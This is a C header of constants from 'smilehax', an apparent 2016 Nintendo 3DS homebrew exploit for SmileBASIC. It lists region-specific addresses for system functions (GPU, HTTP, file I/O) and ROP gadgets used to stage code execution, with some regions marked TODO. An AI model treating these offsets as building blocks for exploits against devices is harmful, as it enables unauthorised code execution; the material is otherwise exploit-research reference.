/* smilehax - smilebasic exploit */
/* plutoo 2016 */

REGION_CONST(CODE_DST_VA, 0x00279900, TODO, 0x002a2400);
#ifdef NEW3DS
REGION_CONST(CODE_DST_PA, 0x27aa9900, TODO, 0x27ab2400);
#else
REGION_CONST(CODE_DST_PA, 0x23ea9900, TODO, 0x23eb2400);
#endif

GLOBAL_CONST(CODE_BUF, 0x30020000);
GLOBAL_CONST(STAGE1_BASE, 0x30010000);
GLOBAL_CONST(OTHERAPP_CODE_VA, 0x00101000);
GLOBAL_CONST(OTHERAPP_CODE_PA, CODE_VA_TO_PA(OTHERAPP_CODE_VA));
GLOBAL_CONST(OTHERAPP_SIZE, 0xC000);
GLOBAL_CONST(PARAMBLK_ADDR, 0x30000000);
GLOBAL_CONST(FRAMEBUF_ADDR, 0x30000000);
GLOBAL_CONST(FRAMEBUF_SIZE, (400*240*4));

/* Functions. */
REGION_CONST(SVC_SLEEP_THREAD, 0x001d0850, TODO, 0x001e5628);
REGION_CONST(SVC_KILL_THREAD, 0x0011e4dc, TODO, 0x0011ee2c);
REGION_CONST(GSP_WRITE_HW_REGS, 0x0012076c, TODO, 0x0012151c);
REGION_CONST(GSP_FLUSH_DATA_CACHE, 0x00125fa8, TODO, 0x00126a70);
REGION_CONST(GSPGPU_SERVHANDLEADR, 0x002cdcdc, TODO, 0x002f785c);
REGION_CONST(GSP_GX_CMD4, 0x00126114, TODO, 0x00126b70);
REGION_CONST(GSP_THREAD_OBJ_PTR, 0x002a3c40, TODO, 0x002dac40);
REGION_CONST(MEMCPY, 0x001da684, TODO, 0x001ef248);
REGION_CONST(SNPRINTF, 0x0011a0e8, TODO, 0x001ebc3c);
REGION_CONST(HTTPC_INITSTRUCT, 0x001b81dc, TODO, 0x001cc384);
REGION_CONST(HTTPC_BEGINREQUEST, 0x001b8194, TODO, 0x00255dd4);
REGION_CONST(HTTPC_RECVDATA, 0x001b7c0c, TODO, 0x001cd034);
REGION_CONST(HTTPC_GETSIZE, 0x002504a4, TODO, 0x00270e1c);
REGION_CONST(FS_CREATE_FILE, 0x001e0de8, TODO, 0x0020047c);
REGION_CONST(FS_OPEN_FILE, 0x001dd544, TODO, 0x001ec1f4);
REGION_CONST(FS_WRITE_FILE, 0x00116cd8, TODO, 0x00117824);
REGION_CONST(FS_READ_FILE, 0x0010f1ac, TODO, 0x001e28f8);
REGION_CONST(FS_DELETE_FILE, 0x001c46f8, TODO, 0x001d8d24);

/* Rop gadgets. */
REGION_CONST(GSP_ENQUEUE_CMD_GADGET, 0x00125e24, TODO, 0x001268ec);
REGION_CONST(GADGET_R0, 0x00134544, TODO, 0x001340ec);
REGION_CONST(GADGET_R1, 0x001deb70, TODO, 0x001f5054);
REGION_CONST(GADGET_R1R2R3R4R5, 0x00103b57, TODO, 0x001039bf);
REGION_CONST(GADGET_NOP, 0x0010193d, TODO, 0x00104450);
REGION_CONST(GADGET_POP_R4R5LR__BX_LR, 0x00104730, TODO, 0x001045d4);
